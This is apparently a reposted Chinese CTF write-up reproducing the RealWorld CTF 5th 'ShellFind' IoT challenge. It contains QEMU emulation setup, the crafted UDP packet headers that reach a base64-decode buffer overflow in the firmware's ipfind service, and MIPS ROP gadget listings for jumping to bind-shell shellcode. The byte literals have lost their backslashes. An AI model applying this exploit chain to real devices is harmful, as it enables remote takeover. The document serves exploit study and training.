# RWCTF 5th Shellfind复现

> 原文: https://www.ctfiot.com/94114.html
> ID: 94114

前言

RealWorld CTF 5th 里的一道iot-pwn，根据真实设备固件改编而成，觉得题目贴近iot实战且很有意思，故在此记录一下复现过程。

题目分析

题目描述

Hello Hacker.
You don't know me, but I know you.
I want to play a game. Here's what happens if you lose.
The device you are watching is hooked into your Saturday and Sunday.
When the timer in the back goes off,
your curiosity will be permanently ripped open.
Think of it like a reverse bear trap.
Here, I'll show you.
There is only one UDP service to shell the device.
It's in the stomach of your cold firmware.
Look around Hacker. Know that I'm not lying.
Better hurry up.
Shell or out, make your choice.

从中可以看出漏洞大概率存在于UDP服务中。

固件分析

拿到手的是一个bin包，解压出来可以得到一个完整的文件系统。相比于常规pwn题单一的二进制而言，我们首先要做的是寻找漏洞文件。既然是真实设备改编那我们就可以先在网上找一找官方固件并尝试下载最新版本。

下载到官方的固件后，可以采取bindiff等方法去找被修改过的二进制文件。可以初步判定漏洞应该是出在ipfind程序中。

并且发现此固件为mips大端，且可疑漏洞文件没开保护。

固件模拟

我是直接用qemu去模拟的这个固件，当然也可以尝试用FirmAE，firmadyne，firmware-analysis-plus等工具去进行模拟。我的qemu启动脚本如下：

sudo ifconfig ens33 down
sudo brctl addbr br0
sudo brctl addif br0 ens33
sudo ifconfig br0 0.0.0.0 promisc up
sudo ifconfig ens33 0.0.0.0 promisc up
sudo dhclient br0
sudo tunctl -t tap0
sudo brctl addif br0 tap0
sudo ifconfig tap0 0.0.0.0 promisc up
sudo qemu-system-mips 
    -M malta -kernel vmlinux-3.2.0-4-4kc-malta 
    -hda debian_wheezy_mips_standard.qcow2 
    -append "root=/dev/sda1 console=tty0" 
    -net nic,macaddr=00:16:3e:00:00:01 
    -net tap,ifname=tap0,script=no,downscript=no 
    -nographic

启动完成之后用scp把固件包、gdbserver、完整的busybox等传上去。之后用如下命令切换到固件包根目录进行操作:

mount -t proc /proc ./squashfs-root/proc
mount -o bind /dev ./squashfs-root/dev
chroot ./squashfs-root/ sh

之后通过/etc/rc.d/rcS初始化服务。

启动完成之后通过./busybox-mips netstat -pantu去查看开放的端口及对应的二进制文件。

可以看到我们之前分析的可疑文件ipfind正是UDP服务，开放端口为62720。

值得注意的是我们用ps去查看进程发现执行的是/usr/sbin/ipfind br0这个命令，但我qemu的有效网卡是eth0，这样以后我们会发现无法使用gdbserver进行调试，故我们要杀死该进程，并执行/usr/sbin/ipfind eth0 &，这样我们就可以使用gdbserver进行愉快的调试了。

漏洞文件分析

首先是建立socket通信并绑定到62720端口，与刚才看到的端口一致。

接着从client端接收数据，并进行一系列的操作。之后会对数据进行一个判断，以此来确定是否进入sub_40172C函数或sub_4013F4函数。

sub_40172C函数

想进入这个函数我们可以逆出来它所需接受的内容开头应该为:

header1 = b"FIVI"
header1+= b"x00x00x00x00"
header1+= b"x0Ax01x00x00"
header1+= b"x00x00x00x00"
header1+= b"x00"
header1+= b"xFFxFFxFFxFFxFFxFF"
header1+= b"x00x00"
header1+= b"x00x00x00x00"

这个函数会调用sub_400E50得到net_get_hwaddr(ifname, a1 + 17)，实际上就是mac addr（qemu启动时可以进行设置，之后打印出来对比一下即可），并把它发送到client端。这个值对于我们进入第二个函数必不可少。

sub_4013F4函数

想进入这个函数我们可以逆出来它所需接受的内容开头应该为:

header2 = b"FIVI"
header2+= b"x00x00x00x00"
header2+= b"x0Ax02x00x00"
header2+= b"x00x00x00x00"
header2+= b"x00"
header2+= mac
header2+= b"x00x00"
header2+= b"x8Ex00x00x00"

进入这个函数后，我们即可找到我们的漏洞函数sub_400F50，这个函数有两次base64 decode，第二次解码时会发生缓冲区溢出。

漏洞利用

因为没开保护，我们布置好rop跳到shellcode上即可。但是我们由于没有libc地址，我们需要花费一定时间在ipfind这个文件里去找gadgets进行利用。

我们想要跳转到shellcode上执行，那么我们就需要可以泄露栈地址的gadget，于是我们找到了如下的gadget来泄露栈地址：

.text:
004013D0 sub_4013D0: # CODE XREF: sub_4013F4+9C↓p
.text:
004013D0 # sub_4013F4+160↓p ...
.text:
004013D0
.text:
004013D0 var_8 = -8
.text:
004013D0 arg_4 = 4
.text:
004013D0 arg_8 = 8
.text:
004013D0 arg_C = 0xC
.text:
004013D0
.text:
004013D0 addiu $sp, -0x10
.text:
004013D4 sw $a1, 0x10+arg_4($sp)
.text:
004013D8 sw $a2, 0x10+arg_8($sp)
.text:
004013DC sw $a3, 0x10+arg_C($sp)
.text:
004013E0 addiu $v0, $sp, 0x10+arg_4
.text:
004013E4 sw $v0, 0x10+var_8($sp)
.text:
004013E8 addiu $sp, 0x10
.text:
004013EC jr $ra
.text:
004013F0 nop

这个gadget可以控制v0为栈地址，我们向上交叉引用找到一个既能控制ra又不改变v0的gadget下：

.text:
00401F98 jal sub_4013D0
.text:
00401F9C li $a0, aCanTGetHelloSo # "Can't get hello socketn"
.text:
00401FA0 b loc_4020B4
.text:
00401FA4 nop

.text:
004020B4 loc_4020B4: # CODE XREF: sub_401DF4+1AC↑j
.text:
004020B4 # sub_401DF4+238↑j ...
.text:
004020B4 lw $ra, 0x7C+var_s8($sp)
.text:
004020B8 lw $s1, 0x7C+var_s4($sp)
.text:
004020BC lw $s0, 0x7C+var_s0($sp)
.text:
004020C0 jr $ra
.text:
004020C4 addiu $sp, 0x88

但是在走这条gadget之前我们得先恢复gp寄存器，并且还要考虑到a1,a2,a3寄存器对栈的影响，最好可以控制为nop指令，以免对刚才泄露出来的栈地址上指令造成影响。

.text:
00401218 lw $gp, 0x9C+var_8C($sp)
.text:
0040121C la $t9, close
.text:
00401220 jalr $t9 ; close
.text:
00401224 move $a0, $s0 # fd
.text:
00401228 move $v0, $zero
.text:
0040122C
.text:
0040122C loc_40122C: # CODE XREF: sub_401120+80↑j
.text:
0040122C # sub_401120+A0↑j
.text:
0040122C lw $ra, 0x9C+var_s8($sp)
.text:
00401230 lw $s1, 0x9C+var_s4($sp)
.text:
00401234 lw $s0, 0x9C+var_s0($sp)
.text:
00401238 jr $ra
.text:
0040123C addiu $sp, 0xA8

接着可以找到如下gadget使得可以跳转到S0寄存器存指向的地址中：

.text:
004027C0 loc_4027C0: # CODE XREF: sub_402790+3C↓j
.text:
004027C0 jalr $t9
.text:
004027C4 nop
.text:
004027C8
.text:
004027C8 loc_4027C8: # CODE XREF: sub_402790+28↑j
.text:
004027C8 lw $t9, 0($s0)
.text:
004027CC bne $t9, $s1, loc_4027C0
.text:
004027D0 addiu $s0, -4
.text:
004027D4 lw $ra, 0x1C+var_s8($sp)
.text:
004027D8 lw $s1, 0x1C+var_s4($sp)
.text:
004027DC lw $s0, 0x1C+var_s0($sp)
.text:
004027E0 jr $ra
.text:
004027E4 addiu $sp, 0x28

最后找一个可以把v0赋给任意地址，并且可以控制s0的gadget即可：

.text:
00400F28 sw $v0, 0xD($s0)
.text:
00400F2C
.text:
00400F2C loc_400F2C: # CODE XREF: sub_400E50+CC↑j
.text:
00400F2C la $v0, ifname
.text:
00400F30 lw $a0, (ifname - 0x413138)($v0)
.text:
00400F34 la $t9, net_get_hwaddr
.text:
00400F38 jalr $t9 ; net_get_hwaddr
.text:
00400F3C addiu $a1, $s0, 0x11
.text:
00400F40 lw $ra, 0x20+var_s4($sp)
.text:
00400F44 lw $s0, 0x20+var_s0($sp)
.text:
00400F48 jr $ra
.text:
00400F4C addiu $sp, 0x28

最后跟上一个udp_bind_shell的shellcode即可。布置完rop经过调试可知我们还需要写一个短跳转指令我用的短跳转指令是"x10x00x00x30" # b 0xC4，使得我们能够从泄露的栈地址跳转到我们的shellcode处。

exploit效果

完整exploit见：https://github.com/fxc233/CTF/blob/main/IOT/RealWorldCTF-5th-ShellFind/exp.py

参考文章

https://mp.weixin.qq.com/s/Wb7SMy8AHtiv71kroHEHsQ

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
Hello Hacker.
You don't know me, but I know you.
I want to play a game. Here's what happens if you lose.
The device you are watching is hooked into your Saturday and Sunday.
When the timer in the back goes off,
your curiosity will be permanently ripped open.
Think of it like a reverse bear trap.
Here, I'll show you.
There is only one UDP service to shell the device.
It's in the stomach of your cold firmware.
Look around Hacker. Know that I'm not lying.
Better hurry up.
Shell or out, make your choice.
sudo ifconfig ens33 down
sudo brctl addbr br0
sudo brctl addif br0 ens33
sudo ifconfig br0 0.0.0.0 promisc up
sudo ifconfig ens33 0.0.0.0 promisc up
sudo dhclient br0
sudo tunctl -t tap0
sudo brctl addif br0 tap0
sudo ifconfig tap0 0.0.0.0 promisc up
sudo qemu-system-mips 
    -M malta -kernel vmlinux-3.2.0-4-4kc-malta 
    -hda debian_wheezy_mips_standard.qcow2 
    -append "root=/dev/sda1 console=tty0" 
    -net nic,macaddr=00:16:3e:00:00:01 
    -net tap,ifname=tap0,script=no,downscript=no 
    -nographic
mount -t proc /proc ./squashfs-root/proc
mount -o bind /dev ./squashfs-root/dev
chroot ./squashfs-root/ sh
header1 = b"FIVI"
header1+= b"x00x00x00x00"
header1+= b"x0Ax01x00x00"
header1+= b"x00x00x00x00"
header1+= b"x00"
header1+= b"xFFxFFxFFxFFxFFxFF"
header1+= b"x00x00"
header1+= b"x00x00x00x00"
header2 = b"FIVI"
header2+= b"x00x00x00x00"
header2+= b"x0Ax02x00x00"
header2+= b"x00x00x00x00"
header2+= b"x00"
header2+= mac
header2+= b"x00x00"
header2+= b"x8Ex00x00x00"
.text:
004013D0 sub_4013D0: # CODE XREF: sub_4013F4+9C↓p
.text:
004013D0 # sub_4013F4+160↓p ...
.text:
004013D0
.text:
004013D0 var_8 = -8
.text:
004013D0 arg_4 = 4
.text:
004013D0 arg_8 = 8
.text:
004013D0 arg_C = 0xC
.text:
004013D0
.text:
004013D0 addiu $sp, -0x10
.text:
004013D4 sw $a1, 0x10+arg_4($sp)
.text:
004013D8 sw $a2, 0x10+arg_8($sp)
.text:
004013DC sw $a3, 0x10+arg_C($sp)
.text:
004013E0 addiu $v0, $sp, 0x10+arg_4
.text:
004013E4 sw $v0, 0x10+var_8($sp)
.text:
004013E8 addiu $sp, 0x10
.text:
004013EC jr $ra
.text:
004013F0 nop
.text:
00401F98 jal sub_4013D0
.text:
00401F9C li $a0, aCanTGetHelloSo # "Can't get hello socketn"
.text:
00401FA0 b loc_4020B4
.text:
00401FA4 nop

.text:
004020B4 loc_4020B4: # CODE XREF: sub_401DF4+1AC↑j
.text:
004020B4 # sub_401DF4+238↑j ...
.text:
004020B4 lw $ra, 0x7C+var_s8($sp)
.text:
004020B8 lw $s1, 0x7C+var_s4($sp)
.text:
004020BC lw $s0, 0x7C+var_s0($sp)
.text:
004020C0 jr $ra
.text:
004020C4 addiu $sp, 0x88
.text:
00401218 lw $gp, 0x9C+var_8C($sp)
.text:
0040121C la $t9, close
.text:
00401220 jalr $t9 ; close
.text:
00401224 move $a0, $s0 # fd
.text:
00401228 move $v0, $zero
.text:
0040122C
.text:
0040122C loc_40122C: # CODE XREF: sub_401120+80↑j
.text:
0040122C # sub_401120+A0↑j
.text:
0040122C lw $ra, 0x9C+var_s8($sp)
.text:
00401230 lw $s1, 0x9C+var_s4($sp)
.text:
00401234 lw $s0, 0x9C+var_s0($sp)
.text:
00401238 jr $ra
.text:
0040123C addiu $sp, 0xA8
.text:
004027C0 loc_4027C0: # CODE XREF: sub_402790+3C↓j
.text:
004027C0 jalr $t9
.text:
004027C4 nop
.text:
004027C8
.text:
004027C8 loc_4027C8: # CODE XREF: sub_402790+28↑j
.text:
004027C8 lw $t9, 0($s0)
.text:
004027CC bne $t9, $s1, loc_4027C0
.text:
004027D0 addiu $s0, -4
.text:
004027D4 lw $ra, 0x1C+var_s8($sp)
.text:
004027D8 lw $s1, 0x1C+var_s4($sp)
.text:
004027DC lw $s0, 0x1C+var_s0($sp)
.text:
004027E0 jr $ra
.text:
004027E4 addiu $sp, 0x28
.text:
00400F28 sw $v0, 0xD($s0)
.text:
00400F2C
.text:
00400F2C loc_400F2C: # CODE XREF: sub_400E50+CC↑j
.text:
00400F2C la $v0, ifname
.text:
00400F30 lw $a0, (ifname - 0x413138)($v0)
.text:
00400F34 la $t9, net_get_hwaddr
.text:
00400F38 jalr $t9 ; net_get_hwaddr
.text:
00400F3C addiu $a1, $s0, 0x11
.text:
00400F40 lw $ra, 0x20+var_s4($sp)
.text:
00400F44 lw $s0, 0x20+var_s0($sp)
.text:
00400F48 jr $ra
.text:
00400F4C addiu $sp, 0x28
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/3-1674868244.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/6-1674868244.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/1-1674868244.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/2-1674868245.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/0-1674868245.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/5-1674868246.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/7-1674868246.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/1-1674868246.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/9-1674868246.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/2-1674868247.png)